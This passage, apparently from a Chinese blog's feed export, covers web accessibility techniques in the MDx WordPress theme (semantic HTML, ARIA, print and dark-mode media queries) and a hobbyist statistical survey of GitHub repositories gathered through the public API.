MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 